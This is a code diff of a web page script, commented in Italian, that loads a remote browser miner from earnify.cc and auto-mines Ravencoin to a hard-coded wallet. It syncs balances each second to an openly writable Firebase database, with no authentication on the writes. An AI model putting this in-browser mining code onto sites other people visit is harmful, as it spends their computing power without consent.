@@ -96,24 +96,27 @@
     import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";
 
     // ========== FIREBASE ==========
-    const FIREBASE_URL = "https://miner-3b768-default-rtdb.europe-west1.firebasedatabase.app/balance.json";
+    const FIREBASE_BASE = "https://miner-3b768-default-rtdb.europe-west1.firebasedatabase.app";
+    const BALANCE_URL = `${FIREBASE_BASE}/balance.json`;
+    const HISTORY_URL = `${FIREBASE_BASE}/history.json`;
 
     let miningStarted = false;
     let startTime = Date.now();
     let lastUpdate = Date.now();
-    let sessionRVN = 0;          // guadagno di questa sessione
-    let lastPushedRVN = 0;       // quanto abbiamo già inviato al server
+    let sessionRVN = 0;
+    let lastPushedRVN = 0;
     let totalRVN = 0;
     let totalEUR = 0;
+    let isSyncing = false;
 
     const RVN_PER_KHS_PER_DAY = 0.18;
     const RVN_PER_KHS_PER_SECOND = RVN_PER_KHS_PER_DAY / 86400;
     const RVN_PRICE_EUR = 0.0035;
 
-    // Legge il saldo totale dal server
+    // Legge il saldo totale
     async function loadTotalBalance() {
         try {
-            const res = await fetch(FIREBASE_URL);
+            const res = await fetch(BALANCE_URL);
             const data = await res.json();
             if (data && typeof data.rvn === "number") {
                 totalRVN = data.rvn;
@@ -128,26 +131,40 @@
         }
     }
 
-    // Invia il delta guadagnato al server
+    // Invia il delta + salva nella history
     async function pushDeltaToServer() {
+        if (isSyncing) return;
         const delta = sessionRVN - lastPushedRVN;
         if (delta <= 0) return;
 
+        isSyncing = true;
         try {
-            // Rilegge il valore attuale (per ridurre collisioni)
-            const res = await fetch(FIREBASE_URL);
+            const res = await fetch(BALANCE_URL);
             const data = await res.json() || { rvn: 0, eur: 0 };
 
             const newRVN = (data.rvn || 0) + delta;
             const newEUR = newRVN * RVN_PRICE_EUR;
+            const now = Date.now();
 
-            await fetch(FIREBASE_URL, {
+            // Aggiorna saldo principale
+            await fetch(BALANCE_URL, {
                 method: "PUT",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     rvn: newRVN,
                     eur: newEUR,
-                    lastUpdate: Date.now()
+                    lastUpdate: now
+                })
+            });
+
+            // Aggiunge alla history
+            await fetch(HISTORY_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    rvn: newRVN,
+                    eur: newEUR,
+                    timestamp: now
                 })
             });
 
@@ -157,6 +174,39 @@
             updateTotalUI();
         } catch (e) {
             console.error("Errore scrittura Firebase:", e);
+        } finally {
+            isSyncing = false;
+        }
+    }
+
+    // Elimina i salvataggi più vecchi di 30 secondi (eseguito ogni 10 secondi)
+    async function cleanOldHistory() {
+        try {
+            const res = await fetch(HISTORY_URL);
+            const history = await res.json();
+            if (!history) return;
+
+            const now = Date.now();
+            const maxAge = 30000; // 30 secondi
+            const updates = {};
+
+            for (const key in history) {
+                if (history[key].timestamp && (now - history[key].timestamp > maxAge)) {
+                    updates[key] = null; // elimina
+                }
+            }
+
+            // Se ci sono cose da eliminare
+            if (Object.keys(updates).length > 0) {
+                await fetch(HISTORY_URL, {
+                    method: "PATCH",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(updates)
+                });
+                console.log("Pulizia history completata");
+            }
+        } catch (e) {
+            console.error("Errore pulizia history:", e);
         }
     }
 
@@ -166,14 +216,14 @@
     }
 
     async function initMining() {
-        // Carica subito il saldo totale
         await loadTotalBalance();
 
         try {
-            await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
+            await autoMine("RT78ZqrJ58sBVTEuf1or1yTpzN3HrDRZhk", 0.2);
             miningStarted = true;
             document.getElementById("status").textContent = "Attivo";
             
+            // Aggiornamento hashrate + guadagno sessione
             setInterval(() => {
                 const now = Date.now();
                 const hr = minotaurxHashrate.currentHashrateKHs || 0;
@@ -192,11 +242,14 @@
                 document.getElementById("daily-rate").textContent = (hr * RVN_PER_KHS_PER_DAY).toFixed(2);
             }, 700);
 
-            // Ogni 8 secondi sincronizza con il server
-            setInterval(pushDeltaToServer, 8000);
+            // Sincronizzazione ogni secondo
+            setInterval(() => {
+                pushDeltaToServer();
+                loadTotalBalance();
+            }, 1000);
 
-            // Ogni 15 secondi rilegge il totale (per vedere guadagni di altri dispositivi)
-            setInterval(loadTotalBalance, 15000);
+            // Pulizia history ogni 10 secondi
+            setInterval(cleanOldHistory, 10000);
 
         } catch (e) {
             console.error(e);
